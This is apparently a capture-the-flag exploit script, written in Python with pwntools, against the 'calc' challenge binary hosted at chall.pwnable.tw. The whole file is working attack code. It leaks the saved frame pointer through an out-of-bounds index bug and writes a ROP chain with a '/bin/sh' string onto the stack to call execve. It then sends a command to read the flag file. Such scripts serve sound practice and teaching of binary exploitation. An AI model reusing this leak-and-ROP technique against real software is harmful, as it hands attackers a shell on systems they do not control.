#!/usr/bin/env python

from pwn import *

LOCAL=True

e=ELF("/tmp/calc")
gadget=lambda x: next(e.search(asm(x)))

pop_eax=gadget("pop eax; ret")
pop_ecx_ebx=gadget("pop ecx; pop ebx; ret")
pop_edx=gadget("pop edx; ret")
int_80=gadget("int 0x80")

def menu():
    p.recvuntil("tor ===\n")
    return p

def wait(listen,send):
    p.recvuntil(listen)
    p.sendline(send)
    return p.recvline()

def read_from_offset(offset):
    p.send('+'+str(offset).encode('ascii')+'\n')
    res=p.recv(100)[:-1].encode('ascii')
    return res

def write_to_mem(offset, value):
    p.send('+' + str(offset).encode('ascii')+'\n')
    res=int(p.recv(100)[:-1].decode('ascii'))

    value_to_add=value-res
    operation='+'

    if value_to_add < 0:
        operation='-'
        value_to_add=value_to_add*(-1)

    p.send('+'+str(offset).encode('ascii')+operation+str(value_to_add).encode('ascii')+'\n')
    res=p.recv(100)[:-1].encode('ascii')


def launch_gdb():
    context.terminal=['gnome-terminal','-x','bash','-c']
    print "pid: ",str(proc.pidof(p)[0])
    gdb.attach(proc.pidof(p)[0], '''handle SIGALRM ignore\nb *0x8049378\nc''')

context.clear(kernel="i386", log_level="DEBUG")
elf=ELF("/tmp/calc")
if LOCAL:
    p=process("/tmp/calc")
    launch_gdb()
else:
    p=remote("chall.pwnable.tw",10100)

#canary=int(wait("tor ===\n","+357").strip())
menu()
ebp=int(read_from_offset(360))
ret_addr_offset=ebp-28
current_offset=361


print "{} -> 0x{:08x}".format("Saved frame pointer ".ljust(20," "), ebp)
print "{} -> 0x{:08x}".format("Ret addr ".ljust(20," "), ret_addr_offset)
print "{} @ 0x{:08x}".format("pop eax ".ljust(20," "), pop_eax)
print "{} @ 0x{:08x}".format("pop ecx; pop ebx ".ljust(20," "), pop_ecx_ebx)
print "{} @ 0x{:08x}".format("pop edx ".ljust(20," "), pop_edx)
print "{} @ 0x{:08x}".format("int 0x80 ".ljust(20," "), int_80)


#log.info("Canary: {:X}".format(canary))

write_to_mem(current_offset, pop_eax); current_offset += 1
write_to_mem(current_offset, 11); current_offset += 1                               #4
write_to_mem(current_offset, pop_edx); current_offset += 1                          #8
write_to_mem(current_offset, ret_addr_offset+0x30); current_offset += 1             #12
write_to_mem(current_offset, pop_ecx_ebx); current_offset += 1                      #16
write_to_mem(current_offset, ret_addr_offset+0x20); current_offset += 1             #20
write_to_mem(current_offset, ret_addr_offset+0x28); current_offset += 1             #24   
write_to_mem(current_offset, int_80); current_offset += 1                           #28
write_to_mem(current_offset, ret_addr_offset+0x28); current_offset += 1             #32
write_to_mem(current_offset, 0x00000000); current_offset += 1                       #36
write_to_mem(current_offset, 0x6e69622f); current_offset += 1                       #40
write_to_mem(current_offset, 0x0068732f); current_offset += 1                       #44
write_to_mem(current_offset, 0x00000000); current_offset += 1                       #48

p.send("\n")
p.send("cat /home/calc/flag\n")
print(p.recv(100))
#p.interactive()
p.close()
